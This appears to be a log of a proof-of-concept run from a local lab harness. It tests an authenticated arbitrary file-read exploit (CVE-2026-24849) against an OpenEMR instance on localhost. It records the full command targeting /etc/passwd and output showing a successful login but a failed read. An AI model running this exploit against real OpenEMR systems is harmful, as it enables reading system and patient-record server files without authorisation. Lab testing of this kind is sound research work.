@@ -1,0 +1,21 @@
+AMENDER PoC run — 2026-10-08T02:24:44
+CVE:        CVE-2026-24849 (EDB 52610, OpenEMR 7.0.2 arbitrary file read)
+PoC:        /home/rezwan/openemr-lab/data/pocs/52610.py
+Target:     http://localhost:8080
+User:       <redacted>  Site: default
+Probe file: /etc/passwd
+Command:    /usr/bin/python3 /home/rezwan/openemr-lab/data/pocs/52610.py -t http://localhost:8080 -u *** -P *** -s default -f /etc/passwd -o logs/runs/20261008-022442_edb52610.loot
+Exit code:  2
+VERDICT:    READ_FAIL — Authenticated, but the file read returned nothing — the Fax/SMS module may not be enabled with EtherFax as provider.
+
+===== STDOUT =====
+[*] OpenEMR < 7.0.4 - Authenticated Arbitrary File Read (CVE-2026-24849)
+
+[*] Authenticating to http://localhost:8080 as 'admin' ...
+[!] Logged in, but the file-read returned nothing.
+    Confirm the Fax/SMS module is enabled with EtherFax as the provider.
+
+[-] '/etc/passwd' not found/readable, or Fax/SMS+EtherFax is not enabled.
+
+===== STDERR =====
+
